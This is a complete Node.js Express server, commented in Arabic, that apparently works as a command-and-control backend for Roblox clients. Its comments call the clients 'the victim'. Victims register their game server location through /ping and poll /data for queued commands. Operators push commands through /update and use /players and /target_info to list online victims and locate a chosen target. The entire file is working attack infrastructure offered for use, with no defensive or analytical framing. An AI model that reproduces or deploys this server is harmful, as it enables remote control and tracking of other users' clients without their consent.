const express = require('express');
const app = express();
app.use(express.json());

let activePlayers = {};
let commandsQueue = []; // قائمة انتظار الأوامر

// [تحديث] استقبال إشارة الضحية
app.post('/ping', (req, res) => {
    const { username, placeId, jobId } = req.body;
    if (username) {
        activePlayers[username] = {
            placeId,
            jobId,
            lastSeen: Date.now()
        };
    }
    res.send("Updated");
});

// [إضافة] إرسال أمر جديد للقائمة
app.post('/update', (req, res) => {
    const { username, message } = req.body;
    const newCommand = {
        id: Math.random().toString(36).substr(2, 9), // ID فريد للأمر
        commander: username,
        content: message,
        time: Date.now()
    };
    commandsQueue.push(newCommand);
    
    // حفظ آخر 20 أمر فقط لتجنب امتلاء الذاكرة
    if (commandsQueue.length > 20) commandsQueue.shift();
    
    res.json({ status: "Sent", commandId: newCommand.id });
});

// [تحديث] الضحية تطلب الأوامر (ترسل آخر ID نفذته)
app.get('/data', (req, res) => {
    const lastId = req.query.lastId;
    // إرسال الأوامر الجديدة فقط التي لم تنفذها الضحية بعد
    const newCommands = commandsQueue.filter(cmd => cmd.id !== lastId && cmd.time > (Date.now() - 30000));
    res.json(newCommands[newCommands.length - 1] || { message: "No Command" });
});

app.get('/players', (req, res) => {
    const now = Date.now();
    const onlineList = Object.keys(activePlayers).filter(user => (now - activePlayers[user].lastSeen) < 15000);
    res.json(onlineList);
});

app.get('/target_info', (req, res) => {
    const info = activePlayers[req.query.username];
    if (info && (Date.now() - info.lastSeen < 15000)) {
        res.json({ placeId: info.placeId, jobId: info.jobId, status: "Online" });
    } else {
        res.status(404).json({ status: "Offline" });
    }
});

app.listen(process.env.PORT || 3000);
